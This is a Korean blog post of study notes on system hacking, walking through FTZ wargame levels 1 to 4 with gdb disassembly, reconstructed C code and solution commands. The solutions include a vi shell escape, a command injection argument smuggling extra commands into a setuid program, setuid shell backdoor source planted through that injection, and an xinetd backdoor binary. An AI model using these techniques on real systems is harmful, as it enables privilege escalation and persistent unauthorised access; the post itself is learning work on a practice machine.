---
layout: article
title: "[System]System hacking"
key: 19700101
tags:
  - Pwnable
toc: true
mathjax: true
mathjax_autoNumber: true
---

# [+] System Hacking(1~9)

<!--more-->

## [+] Memory Layout

### Basic

이번에 사이버공격방어대회에 공격팀으로 출전했으나 포너블 잔치인 것을 보고 시스템 해킹에 뛰어들기로 결심했다. <a href="http://wikibook.co.kr/system-hacking-techniques/?ckattempt=1">문제 풀이로 배우는 시스템 해킹 테크닉</a> 이라는 책을 통해 기초를 공부하고 문제푸는 형식으로 진행한다.

먼저 메모리 구조에 대한 내용이 나온다. 리버싱 공부를 하면서도 했지만 한번 더 !!!!! 

```c
#include <stdio.h>
// Global Variable
int retVal = 0;
int outVal;

int main(void)
{
	char string[] = "Hello";	// 'hello' init
	char *ptr;	// character type pointer
	static int output = 1;	//static variable

	ptr = (char*)malloc(sizeof(string));	//malloc()
	printf("%s\n", string);	//print
	return retVal;
}
```

위의 프로그램의 메모리 레이아웃을 보면 아래와 같다.

| 메모리 세그먼트 | 데이터                           | 코드                                                         |
| --------------- | -------------------------------- | ------------------------------------------------------------ |
| text            | 실행명령                         | #include <stdio.h><br />int main(void)<br />{<br />    printf("%s",string);<br />    return retVal;<br />} |
| data            | 전역,const,static,초기화 된 변수 | int retvat=0;<br />static int output=1;                      |
| BSS             | 초기화 되지 않은 변수            | int outVal;                                                  |
| Heap            | 동적 할당 메모리                 | ptr=(char*)malloc(sizeof(string));                           |
|                 | 힙과 스택의 여분 공간            | 변수가 늘어날 경우 힙과 스택의 시작점 사이에 존재하는 이 공간에 할당 |
| Stack           | 지역변수                         | char string[]="Hello";<br />char *ptr;                       |

음.. 다음은 함수에서 실제 인자가 전달되는 순서에 대한 것이므로 패스하겠다.

## [+] FTZ level1

### Analysis

```
[level1@ftz level1]$ ls -l
total 12
-rw-r--r--    1 root     root           47 Apr  4  2000 hint
drwxr-xr-x    2 root     level1       4096 Dec  7  2003 public_html
drwxrwxr-x    2 root     level1       4096 Oct  1 11:18 tmp
[level1@ftz level1]$ cat hint


level2 권한에 setuid가 걸린 파일을 찾는다.
```

문제로 접근하여 `hint` 파일을 읽어보면 위와 같은 문장이 출력된다. `public_html`의 경우 별로 신경쓰지 않아도 된다.

그렇다면 `setuid`가 걸려있은 파일을 `find` 명령어를 이용하여 먼저 찾아본다.

```
[level1@ftz level1]$ find / f \( -perm +4000 -user level2 \) -exec ls -al {} \; 2>/dev/null
-rwsr-x---    1 level2   level1      12868 Sep 10  2011 /bin/ExecuteMe
```

책과는 다른 방식의 명령이다. 

`gdb`를 이용해 디스어셈블한다.

```assembly
Dump of assembler code for function main:
0x08048488 <main+0>:	push   %ebp
0x08048489 <main+1>:	mov    %esp,%ebp
0x0804848b <main+3>:	sub    $0x28,%esp
0x0804848e <main+6>:	and    $0xfffffff0,%esp
0x08048491 <main+9>:	mov    $0x0,%eax
0x08048496 <main+14>:	sub    %eax,%esp
0x08048498 <main+16>:	sub    $0xc,%esp
0x0804849b <main+19>:	push   $0x8048680
0x080484a0 <main+24>:	call   0x8048358 <system>
0x080484a5 <main+29>:	add    $0x10,%esp
0x080484a8 <main+32>:	sub    $0xc,%esp
0x080484ab <main+35>:	push   $0x804868f
0x080484b0 <main+40>:	call   0x8048378 <chdir>
0x080484b5 <main+45>:	add    $0x10,%esp
0x080484b8 <main+48>:	sub    $0xc,%esp
0x080484bb <main+51>:	push   $0x80486a0
0x080484c0 <main+56>:	call   0x80483a8 <printf>
0x080484c5 <main+61>:	add    $0x10,%esp
0x080484c8 <main+64>:	sub    $0xc,%esp
0x080484cb <main+67>:	push   $0x80486e0
0x080484d0 <main+72>:	call   0x80483a8 <printf>
0x080484d5 <main+77>:	add    $0x10,%esp
0x080484d8 <main+80>:	sub    $0xc,%esp
0x080484db <main+83>:	push   $0x8048720
0x080484e0 <main+88>:	call   0x80483a8 <printf>
0x080484e5 <main+93>:	add    $0x10,%esp
0x080484e8 <main+96>:	sub    $0xc,%esp
0x080484eb <main+99>:	push   $0x8048760
0x080484f0 <main+104>:	call   0x80483a8 <printf>
0x080484f5 <main+109>:	add    $0x10,%esp
0x080484f8 <main+112>:	sub    $0xc,%esp
0x080484fb <main+115>:	push   $0x8048782
0x08048500 <main+120>:	call   0x80483a8 <printf>
0x08048505 <main+125>:	add    $0x10,%esp
0x08048508 <main+128>:	sub    $0x4,%esp
0x0804850b <main+131>:	pushl  0x8049948
0x08048511 <main+137>:	push   $0x1e
0x08048513 <main+139>:	lea    0xffffffd8(%ebp),%eax
0x08048516 <main+142>:	push   %eax
0x08048517 <main+143>:	call   0x8048368 <fgets>
0x0804851c <main+148>:	add    $0x10,%esp
0x0804851f <main+151>:	lea    0xffffffd8(%ebp),%eax
0x08048522 <main+154>:	sub    $0x8,%esp
0x08048525 <main+157>:	push   $0x804879c
0x0804852a <main+162>:	push   %eax
0x0804852b <main+163>:	call   0x8048388 <strstr>
0x08048530 <main+168>:	add    $0x10,%esp
0x08048533 <main+171>:	test   %eax,%eax
0x08048535 <main+173>:	je     0x8048551 <main+201>
0x08048537 <main+175>:	sub    $0xc,%esp
0x0804853a <main+178>:	push   $0x80487c0
0x0804853f <main+183>:	call   0x80483a8 <printf>
0x08048544 <main+188>:	add    $0x10,%esp
0x08048547 <main+191>:	sub    $0xc,%esp
0x0804854a <main+194>:	push   $0x0
0x0804854c <main+196>:	call   0x80483c8 <exit>
0x08048551 <main+201>:	lea    0xffffffd8(%ebp),%eax
0x08048554 <main+204>:	sub    $0x8,%esp
0x08048557 <main+207>:	push   $0x80487e8
0x0804855c <main+212>:	push   %eax
0x0804855d <main+213>:	call   0x8048388 <strstr>
0x08048562 <main+218>:	add    $0x10,%esp
0x08048565 <main+221>:	test   %eax,%eax
0x08048567 <main+223>:	je     0x8048583 <main+251>
0x08048569 <main+225>:	sub    $0xc,%esp
0x0804856c <main+228>:	push   $0x8048800
0x08048571 <main+233>:	call   0x80483a8 <printf>
0x08048576 <main+238>:	add    $0x10,%esp
0x08048579 <main+241>:	sub    $0xc,%esp
0x0804857c <main+244>:	push   $0x0
0x0804857e <main+246>:	call   0x80483c8 <exit>
0x08048583 <main+251>:	sub    $0xc,%esp
0x08048586 <main+254>:	push   $0x8048826
0x0804858b <main+259>:	call   0x80483a8 <printf>
0x08048590 <main+264>:	add    $0x10,%esp
0x08048593 <main+267>:	sub    $0x8,%esp
0x08048596 <main+270>:	push   $0xbba
0x0804859b <main+275>:	push   $0xbba
0x080485a0 <main+280>:	call   0x80483b8 <setreuid>
0x080485a5 <main+285>:	add    $0x10,%esp
0x080485a8 <main+288>:	sub    $0xc,%esp
0x080485ab <main+291>:	lea    0xffffffd8(%ebp),%eax
0x080485ae <main+294>:	push   %eax
0x080485af <main+295>:	call   0x8048358 <system>
0x080485b4 <main+300>:	add    $0x10,%esp
0x080485b7 <main+303>:	leave  
0x080485b8 <main+304>:	ret    
0x080485b9 <main+305>:	nop    
0x080485ba <main+306>:	nop    
0x080485bb <main+307>:	nop    
End of assembler dump.
```

peda가 안써져서 눈뽕맞은 기분이다... `file` 명령어로 해당 파일을 확인하면 `not stripped` 인 것을 확인할 수 있다. 심볼이 존재하기 때문에 함수 이름이 친절히 출력되는 것을 확인할 수 있다.

메인 함수에 존재하는 함수들을 확인해본다.

```assembly
Non-debugging symbols:
0x08048330  _init
0x08048358  system
0x08048368  fgets
0x08048378  chdir
0x08048388  strstr
0x08048398  __libc_start_main
0x080483a8  printf
0x080483b8  setreuid
0x080483c8  exit
0x080483fc  call_gmon_start
0x08048420  __do_global_dtors_aux
0x0804845c  frame_dummy
0x08048488  main
0x080485bc  __libc_csu_init
0x080485ec  __libc_csu_fini
0x08048620  __do_global_ctors_aux
0x08048644  _fini
```

`info functions` 명령어를 이용해  확인하면 위와 같이 함수 목록을 볼 수 있다.
`system()` , `fgets()`, `chdir()`, `strstr()`, `printf()`, `setreuid()`  함수를 사용한다.

이제 어셈블리어를 통하여 소스코드로 복원하는 작업을 해본다. 보통 IDA에서 헥스레이를 이용하면 편하지만 핸드레이라는 수작업이 굉장히 도움이..된다.

```assembly
0x08048488 <main+0>:	push   %ebp
0x08048489 <main+1>:	mov    %esp,%ebp
0x0804848b <main+3>:	sub    $0x28,%esp
0x0804848e <main+6>:	and    $0xfffffff0,%esp
0x08048491 <main+9>:	mov    $0x0,%eax
0x08048496 <main+14>:	sub    %eax,%esp
0x08048498 <main+16>:	sub    $0xc,%esp
# function Prologue
```

함수의 프롤로그라 하는 부분이다. 사실 버퍼오버플로우를 이해하기 위해서는 함수의 호출과정을 알아야 한다. 이 과정은 뒤에서 자세히 다루도록 하겠다.

```assembly
0x0804849b <main+19>:	push   $0x8048680	;  command
0x080484a0 <main+24>:	call   0x8048358 <system>
```

```
(gdb) x/s 0x8048680
0x8048680 <_IO_stdin_used+28>:	 "/usr/bin/clear"
```

위처럼 확인하면 실제 `system('/usr/bin/clear')` 형태로 함수를 사용한 것을 볼 수 있다.

```assembly
0x080484ab <main+35>:	push   $0x804868f	; path
0x080484b0 <main+40>:	call   0x8048378 <chdir>
```

 ```
(gdb) x/s 0x804868f
0x804868f <_IO_stdin_used+43>:	 "/home/level2"
 ```

역시 위와 같이 `chdir`의 인자를 확인하면 `/home/level2` 와 같이 경로가 전달되는 것을 확인할 수 있다.

마찬가지로 `printf` 함수의 인자들을 확인해보면 프로그램 실행 시 출력되는 문자열 및 과정인 것을 볼 수 있다.

```assembly
0x080484bb <main+51>:	push   $0x80486a0	; \n\n\n\t\t레벨2의 권한으로 당신이 원하는 명령어를\n
0x080484c0 <main+56>:	call   0x80483a8 <printf>
0x080484c5 <main+61>:	add    $0x10,%esp
0x080484c8 <main+64>:	sub    $0xc,%esp
0x080484cb <main+67>:	push   $0x80486e0	; \t\t한가지 실행시켜 드리겠습니다.\n
0x080484d0 <main+72>:	call   0x80483a8 <printf>
0x080484d5 <main+77>:	add    $0x10,%esp
0x080484d8 <main+80>:	sub    $0xc,%esp
0x080484db <main+83>:	push   $0x8048720	; \t\t(단, my-pass 와 chmod는 제외)\n 
0x080484e0 <main+88>:	call   0x80483a8 <printf>
0x080484e5 <main+93>:	add    $0x10,%esp
0x080484e8 <main+96>:	sub    $0xc,%esp
0x080484eb <main+99>:	push   $0x8048760	; \n\t\t어떤 명령을 실행시키겠습니까?\n
0x080484f0 <main+104>:	call   0x80483a8 <printf>
0x080484f5 <main+109>:	add    $0x10,%esp
0x080484f8 <main+112>:	sub    $0xc,%esp
0x080484fb <main+115>:	push   $0x8048782	; \n\n\t\t[level2@ftz level2]$ 
0x08048500 <main+120>:	call   0x80483a8 <printf>
```

위와 같은 문자열들이 출력된다. 실제 확인 해본다.

```



		레벨2의 권한으로 당신이 원하는 명령어를
		한가지 실행시켜 드리겠습니다.
		(단, my-pass 와 chmod는 제외)

		어떤 명령을 실행시키겠습니까?


		[level2@ftz level2]$ 

```

이런 식으로 실행된다.  이어서 분석한다.

```assembly
0x08048513 <main+139>:	lea    0xffffffd8(%ebp),%eax
0x08048516 <main+142>:	push   %eax
0x08048517 <main+143>:	call   0x8048368 <fgets>	; fgets로 입력 받음
0x0804851c <main+148>:	add    $0x10,%esp
0x0804851f <main+151>:	lea    0xffffffd8(%ebp),%eax
0x08048522 <main+154>:	sub    $0x8,%esp
0x08048525 <main+157>:	push   $0x804879c	;	"my-pass" 
0x0804852a <main+162>:	push   %eax
0x0804852b <main+163>:	call   0x8048388 <strstr>	; 입력된 값과 0x804879c 비교
0x08048530 <main+168>:	add    $0x10,%esp
0x08048533 <main+171>:	test   %eax,%eax	
0x08048535 <main+173>:	je     0x8048551 <main+201>	; 다르면 점프
0x08048537 <main+175>:	sub    $0xc,%esp
0x0804853a <main+178>:	push   $0x80487c0
0x0804853f <main+183>:	call   0x80483a8 <printf>
0x08048544 <main+188>:	add    $0x10,%esp
0x08048547 <main+191>:	sub    $0xc,%esp
0x0804854a <main+194>:	push   $0x0
0x0804854c <main+196>:	call   0x80483c8 <exit>	; 실행 불가 명령어로 인해 종료
0x08048551 <main+201>:	lea    0xffffffd8(%ebp),%eax
0x08048554 <main+204>:	sub    $0x8,%esp
0x08048557 <main+207>:	push   $0x80487e8	; 'chmod'
0x0804855c <main+212>:	push   %eax
0x0804855d <main+213>:	call   0x8048388 <strstr>	; 입력 값과 0x80487e8 비교
0x08048562 <main+218>:	add    $0x10,%esp
0x08048565 <main+221>:	test   %eax,%eax
0x08048567 <main+223>:	je     0x8048583 <main+251>	; 다르면 0x8048583 으로 점프
0x08048569 <main+225>:	sub    $0xc,%esp
0x0804856c <main+228>:	push   $0x8048800
0x08048571 <main+233>:	call   0x80483a8 <printf>	
0x08048576 <main+238>:	add    $0x10,%esp
0x08048579 <main+241>:	sub    $0xc,%esp
0x0804857c <main+244>:	push   $0x0
0x0804857e <main+246>:	call   0x80483c8 <exit>	; 실행 불가 명령으로 인해 종료
```

소스코드로 복구해보면 다음과 같이 복구할 수 있다.

```c
#include <stdio.h>
int main()
{
        char chmod[] = "chmod";
        char mypass[] = "my-pass";
        char gets[30];
        system("/usr/bin/clear");
        printf("intro output~~\n\n");
        fgets(gets, sizeof(gets),stdin);

        if(strstr(gets,chmod)!=NULL){
                printf("Permission Denied\n");
                exit(0);
        }

        else if(strstr(gets,mypass)!=NULL){
                printf("Permission Denied 2\n");
                exit(0);
        }
        ...
}

```

슈도 코드긴 하지만 어쨋든 이런 형식으로 실행이 되는 것으로 보인다. ```...``` 부분은 아직 분석을 안했기 때문이고 그 위로는 같아 보인다.

```assembly
0x08048586 <main+254>:	push   $0x8048826	; "\n\n"
0x0804858b <main+259>:	call   0x80483a8 <printf>
0x08048590 <main+264>:	add    $0x10,%esp
0x08048593 <main+267>:	sub    $0x8,%esp
0x08048596 <main+270>:	push   $0xbba	; 0x0bba = 3002(gid)
0x0804859b <main+275>:	push   $0xbba	; 0x0bba = 3002(uid)
0x080485a0 <main+280>:	call   0x80483b8 <setreuid>
0x080485a5 <main+285>:	add    $0x10,%esp
0x080485a8 <main+288>:	sub    $0xc,%esp
0x080485ab <main+291>:	lea    0xffffffd8(%ebp),%eax
0x080485ae <main+294>:	push   %eax	;	command 입력 값
0x080485af <main+295>:	call   0x8048358 <system>
0x080485b4 <main+300>:	add    $0x10,%esp
0x080485b7 <main+303>:	leave  
0x080485b8 <main+304>:	ret
```

먼저 입력받은 명령어가 `chmod` 나 `my-pass`가 아닌 경우 "\n\n" 을 통해 개행을 한다. 그 이후 `setreuid` 함수를 통해 uid,gid를 3002의 권한으로 변경하여 입력 받은 명령어를 `system` 함수를 통해 실행하고 종료한다.
3002 의 u,gid를 가지고 있는 유저는 감이 오듯이 `level2` 사용자이다.

```
[level1@ftz level1]$ cat /etc/passwd |grep 3002
level2:x:3002:3002:Level 2:/home/level2:/bin/bash
```

여기까지가 모든 분석의 끝이다. 실제 슈도 코드로 재현한 코드는 다음과 같다.

```c
#include <stdio.h>
int main()
{
        char chmod[] = "chmod";
        char mypass[] = "my-pass";
        char gets[29];
        system("/usr/bin/clear");
        printf("Hello Pwnable~!\n\n");
        fgets(gets, sizeof(gets),stdin);

        if(strstr(gets,chmod)!=NULL){

                printf("Permission Denied\n");
                exit(0);
        }

        else if(strstr(gets,mypass)!=NULL){

                printf("Permission Denied 2\n");
                exit(0);
        }
        printf("\n\n");
        setreuid(3002,3002);
        system(gets);
        return;
}
```

실제 gdb를 통해 살펴보면 매우 흡사한 것을 볼 수 있다.

사실 상 여기까지면 다 기본적인 리눅스 권한 시스템에 대한 내용만으로 풀 수 있다.
먼저 `/bin/ExecuteMe` 를 실행해서 `whoami` 명령을 입력하면 다음과 같은 결과를 볼 수 있다.

```



		레벨2의 권한으로 당신이 원하는 명령어를
		한가지 실행시켜 드리겠습니다.
		(단, my-pass 와 chmod는 제외)

		어떤 명령을 실행시키겠습니까?


		[level2@ftz level2]$ whoami


level2
[level1@ftz level1]$ 
```

보이는 것과 같이 `setreuid` 함수로 인해 `level2`의 권한으로 명령어가 실행되는 것을 볼 수 있다.

```
[level2@ftz level2]$ pwd
/home/level2
[level2@ftz level2]$ whoami
level2
[level2@ftz level2]$ my-pass

Level2 Password is ~~~~~~~~~~~~
```

쨔안! 요곤 기초이므로 패쓰으~!

## [+] SetUID, SetGID, StickyBit

일단 내가 알고 있는 것을 정리해본다.

SetUID : 실행파일에 주로 사용되고 해당 파일이 실행되는 동안 실행한 사용자의 권한이 아닌 파일 소유자의 권한으로 실행이 된다.

SetGID : 디렉토리에 사용되고, 권한이 설정된 디렉토리에 타 사용자가 파일이나 디렉토리를 생성 시 SGID가 설정된 디렉토리의 사용자 그룹의 권한으로 만들어진다.

StickyBit : 공유 폴더의 개념..? 으로 알고 지냈다.

음 알고있던게 맞아서 뿌듯하다. Stickybit는 소유자 외에도 모두가 사용할 수 있지만 수정이나 삭제는 불가능하다.

## [+] FTZ level2

### Analysis

먼저 level1과 마찬가지로 `find` 명령어를 이용해 `level3` 사용자의 권한이 존재하는 파일을 찾는다.

```
[level2@ftz level2]$ find / -perm +6000 -user level3 2>/dev/null
/usr/bin/editor
```

해당 프로그램을 실행하면 익숙한 모습이 눈에 들어온다. 바로 vi editor이다.
여기서 뭘 해야 할지는 gdb를 이용해 해당 프로그램을 분석하며 확인한다.

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x08048360 <main+0>:	push   %ebp
0x08048361 <main+1>:	mov    %esp,%ebp
0x08048363 <main+3>:	sub    $0x8,%esp
0x08048366 <main+6>:	and    $0xfffffff0,%esp
0x08048369 <main+9>:	mov    $0x0,%eax
0x0804836e <main+14>:	sub    %eax,%esp
0x08048370 <main+16>:	sub    $0x8,%esp
0x08048373 <main+19>:	push   $0xbbb
0x08048378 <main+24>:	push   $0xbbb
0x0804837d <main+29>:	call   0x80482a0 <setreuid>
0x08048382 <main+34>:	add    $0x10,%esp
0x08048385 <main+37>:	sub    $0xc,%esp
0x08048388 <main+40>:	push   $0x8048444
0x0804838d <main+45>:	call   0x8048280 <system>
0x08048392 <main+50>:	add    $0x10,%esp
0x08048395 <main+53>:	leave  
0x08048396 <main+54>:	ret    
0x08048397 <main+55>:	nop    
End of assembler dump.
```

길이가 매우 짧다. `setreuid`,`system` 함수가 눈에 들어온다.
`setreuid` 함수에 인자로는 `0xbbb(3003)` 이고 이는 `level3` 사용자의 uid와 gid이다.

```assembly
(gdb) x/s 0x8048444
0x8048444 <_IO_stdin_used+4>:	 "/bin/vi"
```

`system`함수로 전달되는 인자는 위와 같이 `/bin/vi` 로 vi editor를 실행하고 있다.
슈도코드는 다음과 같다.

```c
#include <stdio.h>
int main()
{
        char vi[8]="/bin/vi";
        setreuid(3003,3003);
        system(vi);
        return;

}
```

vi editor에서 명령을 실행시키기 위해서 `!` 을 이용할 수 있다.

```
Level3 Password is "~~~~~~~".
uid=3003(level3) gid=3002(level2) groups=3002(level2)
~
~
:.!my-pass&id
```

위와 같이 `my-pass` 명령어를 통해 패스워드가 에디터 내에 출력되고, `id` 명령을 통해 실제 실행하고 있는 사용자를 확인하면 `level3` 사용자인 것을 확인할 수 있다.

## [+] FTZ level3

### Analysis

먼저 힌트를 확인한다.

```
다음 코드는 autodig의 소스이다.

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int main(int argc, char **argv){
 
    char cmd[100];
 
    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }
 
    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");
    system( cmd );
 
}

이를 이용하여 level4의 권한을 얻어라.

more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면?
```

간략하게 `autodig ` 프로그램은 하나의 인자를 받아 `dig` 명령어를 이용해 특정 옵션과 함께 실행된다.

```
[level3@ftz level3]$ find / -user level4 -exec ls -al {} \; 2>/dev/null
-rwsr-x---    1 level4   level3      12194 Sep 10  2011 /bin/autodig
```

`setuid`가 설정된 것을 확인할 수 있다.  음 굳이 소스코드가 나와있는데 핸드레이를 해야 하나 싶었지만.... 책에서 하니 나도 한다!!!

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x08048430 <main+0>:	push   %ebp
0x08048431 <main+1>:	mov    %esp,%ebp
0x08048433 <main+3>:	sub    $0x78,%esp
0x08048436 <main+6>:	and    $0xfffffff0,%esp
0x08048439 <main+9>:	mov    $0x0,%eax
0x0804843e <main+14>:	sub    %eax,%esp
0x08048440 <main+16>:	cmpl   $0x2,0x8(%ebp)
0x08048444 <main+20>:	je     0x8048475 <main+69>
0x08048446 <main+22>:	sub    $0xc,%esp
0x08048449 <main+25>:	push   $0x8048588
0x0804844e <main+30>:	call   0x8048340 <printf>
0x08048453 <main+35>:	add    $0x10,%esp
0x08048456 <main+38>:	sub    $0x8,%esp
0x08048459 <main+41>:	mov    0xc(%ebp),%eax
0x0804845c <main+44>:	pushl  (%eax)
0x0804845e <main+46>:	push   $0x80485a1
0x08048463 <main+51>:	call   0x8048340 <printf>
0x08048468 <main+56>:	add    $0x10,%esp
0x0804846b <main+59>:	sub    $0xc,%esp
0x0804846e <main+62>:	push   $0x0
0x08048470 <main+64>:	call   0x8048360 <exit>
0x08048475 <main+69>:	sub    $0x8,%esp
0x08048478 <main+72>:	push   $0x80485b2
0x0804847d <main+77>:	lea    0xffffff88(%ebp),%eax
0x08048480 <main+80>:	push   %eax
0x08048481 <main+81>:	call   0x8048370 <strcpy>
0x08048486 <main+86>:	add    $0x10,%esp
0x08048489 <main+89>:	sub    $0x8,%esp
0x0804848c <main+92>:	mov    0xc(%ebp),%eax
0x0804848f <main+95>:	add    $0x4,%eax
0x08048492 <main+98>:	pushl  (%eax)
0x08048494 <main+100>:	lea    0xffffff88(%ebp),%eax
0x08048497 <main+103>:	push   %eax
0x08048498 <main+104>:	call   0x8048330 <strcat>
0x0804849d <main+109>:	add    $0x10,%esp
0x080484a0 <main+112>:	sub    $0x8,%esp
0x080484a3 <main+115>:	push   $0x80485b8
0x080484a8 <main+120>:	lea    0xffffff88(%ebp),%eax
0x080484ab <main+123>:	push   %eax
0x080484ac <main+124>:	call   0x8048330 <strcat>
0x080484b1 <main+129>:	add    $0x10,%esp
0x080484b4 <main+132>:	sub    $0x8,%esp
0x080484b7 <main+135>:	push   $0xbbc
0x080484bc <main+140>:	push   $0xbbc
0x080484c1 <main+145>:	call   0x8048350 <setreuid>
0x080484c6 <main+150>:	add    $0x10,%esp
0x080484c9 <main+153>:	sub    $0xc,%esp
0x080484cc <main+156>:	lea    0xffffff88(%ebp),%eax
0x080484cf <main+159>:	push   %eax
0x080484d0 <main+160>:	call   0x8048310 <system>
0x080484d5 <main+165>:	add    $0x10,%esp
0x080484d8 <main+168>:	leave  
0x080484d9 <main+169>:	ret    
0x080484da <main+170>:	nop    
0x080484db <main+171>:	nop    
End of assembler dump.
```

천천히 분석해보자.. 먼저 아래와 같이 간략하게 정리가 가능하다. `argc`를 비교하여 인자의 갯수가 2개인지 확인한다. `argv[0]`은 프로그램 명이므로 2개라는 것은 `argv[1]`을 의미한다. 사용 방법이 틀린 경우 흔히 사용하는 종료 패턴이다.

```assembly
0x08048440 <main+16>:	cmpl   $0x2,0x8(%ebp)	;	argc 비교
0x08048444 <main+20>:	je     0x8048475 <main+69>
0x08048446 <main+22>:	sub    $0xc,%esp
0x08048449 <main+25>:	push   $0x8048588	;	"Auto Digger Version 0.9\n"
0x0804844e <main+30>:	call   0x8048340 <printf>
0x08048453 <main+35>:	add    $0x10,%esp
0x08048456 <main+38>:	sub    $0x8,%esp
0x08048459 <main+41>:	mov    0xc(%ebp),%eax
0x0804845c <main+44>:	pushl  (%eax)	;	"프로그램 명"
0x0804845e <main+46>:	push   $0x80485a1	;	""Usage : %s host\n""
0x08048463 <main+51>:	call   0x8048340 <printf>
0x08048468 <main+56>:	add    $0x10,%esp
0x0804846b <main+59>:	sub    $0xc,%esp
0x0804846e <main+62>:	push   $0x0
0x08048470 <main+64>:	call   0x8048360 <exit>
```

다음은 실제 프로그램의 흐름이다.

```assembly
0x08048478 <main+72>:	push   $0x80485b2	;	"dig @"
0x0804847d <main+77>:	lea    0xffffff88(%ebp),%eax
0x08048480 <main+80>:	push   %eax
0x08048481 <main+81>:	call   0x8048370 <strcpy>
0x08048486 <main+86>:	add    $0x10,%esp
0x08048489 <main+89>:	sub    $0x8,%esp
0x0804848c <main+92>:	mov    0xc(%ebp),%eax
0x0804848f <main+95>:	add    $0x4,%eax
0x08048492 <main+98>:	pushl  (%eax)	;	argv[1]
0x08048494 <main+100>:	lea    0xffffff88(%ebp),%eax
0x08048497 <main+103>:	push   %eax
0x08048498 <main+104>:	call   0x8048330 <strcat>
0x0804849d <main+109>:	add    $0x10,%esp
0x080484a0 <main+112>:	sub    $0x8,%esp
0x080484a3 <main+115>:	push   $0x80485b8	;	" version.bind chaos txt"
0x080484a8 <main+120>:	lea    0xffffff88(%ebp),%eax
0x080484ab <main+123>:	push   %eax
0x080484ac <main+124>:	call   0x8048330 <strcat>
0x080484b1 <main+129>:	add    $0x10,%esp
0x080484b4 <main+132>:	sub    $0x8,%esp
0x080484b7 <main+135>:	push   $0xbbc	;	3004(level4)
0x080484bc <main+140>:	push   $0xbbc
0x080484c1 <main+145>:	call   0x8048350 <setreuid>
0x080484c6 <main+150>:	add    $0x10,%esp
0x080484c9 <main+153>:	sub    $0xc,%esp
0x080484cc <main+156>:	lea    0xffffff88(%ebp),%eax
0x080484cf <main+159>:	push   %eax
0x080484d0 <main+160>:	call   0x8048310 <system>
```

이제 슈도 코드로 만들어보자.. 사용된 함수는 `strcpy`,`strcat`,`setreuid`,`printf`,`system` 함수이다.

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
        char cmd[104];
        if(argc!=2){
                printf("Not enough arguments.\n");
                exit(0);
                }
        strcpy(cmd,"dig @");
        strcat(cmd,argv[1]);
        strcat(cmd," version.bind chaos txt");
        setreuid(3004,3004);
        system(cmd);
        return;
}
```

위와 같이 만들어 컴파일해서 확인하면 정말 매우 비슷하다. 귣

그렇다면 어떻게 `level4`의 권한을 가져올 수 있을까...!!! 인젝션과 비슷한 원리라고 생각하면 쉽게 접근할 수 있다. `dig` 명령어의 옵션 값인 `version.bind chaos txt` 전에 명령어를 끝내고 연속해서 다른 명령어를 실행하는 방법이다.

```
[level3@ftz level3]$ autodig "168.126.63.1 www.naver; my-pass;"

; <<>> DiG 9.2.1 <<>> @168.126.63.1 www.naver
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 32437
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 0

;; QUESTION SECTION:
;www.naver.			IN	A

;; AUTHORITY SECTION:
.			2251	IN	SOA	a.root-servers.net. nstld.verisign-grs.com. 2018100101 1800 900 604800 86400

;; Query time: 26 msec
;; SERVER: 168.126.63.1#53(168.126.63.1)
;; WHEN: Tue Oct  2 02:35:47 2018
;; MSG SIZE  rcvd: 102

Level4 Password is "~~~~~~~~~~".

sh: line 1: version.bind: command not found
```

보이는 것과 같이 `""` 으로 인자를 하나로 묶어주고 `;` 을 통해 연속된 명령어를 사용할 수 있도록 해준다. 실제 실행되 명령은 `dig @168.126.63.1 www.naver.com; my-pass; version.bind chaos txt` 와 같이 한줄로 명령들이 실행된다. 맨 아래 결과를 보면 `version.bind: command not found`를 확인할 수 있다.

### Backdoor

오... 굉장히 좋은 내용이다. 뭐 사실 패스워드를 획득했으니 필요 없지만 매번 suid가 설정된 `autodig`를 이용해 접근하기 불편하니 백도어를 만들어 놓는다 라는 취지다.

```c
int main(){     
    
        char *cmd[2];        
        cmd[0]="/bin/sh";
        cmd[1]=(void *)0; 
        setreuid(3004,3004);
        execve(cmd[0],cmd,cmd[1]);
}
```

위의 코드를 이용하여 백도어를 만든다. 아래와 같이 `/tmp/backdoor.c` 라는 파일을 만들고 마찬가지로 `autodig`를 이용해 `gcc` , `chmod`를 이용해 컴파일하고 setuid를 설정해주면 된다. 이후로는 해당 프로그램만 실행하면 바로 셸을 획득하는 것을 볼 수 있다.

```
[level3@ftz level3]$ autodig "127.0.0.1;echo 'int main(){char *cmd[2];cmd[0]=\"/bin/sh\";cmd[1]=(void *)0; setreuid(3004,3004);execve(cmd[0],cmd,cmd[1]);}'>/tmp/backdoor.c;"

; <<>> DiG 9.2.1 <<>> @127.0.0.1
;; global options:  printcmd
;; connection timed out; no servers could be reached
sh: line 1: version.bind: command not found
```

## [+] FTZ level4

### Analysis

먼저 문제에 힌트를 확인하면 다음과 같은 문구를 볼 수 있다.

```
[level4@ftz level4]$ cat hint


누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!
```

이를 이용해 `xinetd.d` 디렉토리를 확인하면 `backdoor`라는 친절한 설정파일을 확인할 수 있다.

```
[level4@ftz level4]$ cat /etc/xinetd.d/backdoor 
service finger 
{
	disable	= no
	flags		= REUSE
	socket_type	= stream        
	wait		= no
	user		= level5
	server		= /home/level4/tmp/backdoor
	log_on_failure	+= USERID
}
```

그러나 실제 `server` 필드에 있는 `/home/level4/tmp/backdoor` 가 없으므로 정상적으로 실행되지 않는 것을 확인할 수 있다. 

이 문제는 간단히 해결 가능하다. 아래와 같은 코드를 짜서 해당 경로에 넣어두면된다.

```c
#include <stdio.h>

int main(void){
    
    system("my-pass");
    
}
```

```
[level4@ftz tmp]$ pwd
/home/level4/tmp
[level4@ftz tmp]$ ls backdoor 
backdoor
[level4@ftz tmp]$ finger level4@localhost
^[[H^[[J
Level5 Password is "~~~~~~~~~~~~~~".
```



## [+] FTZ level5

### Analysis

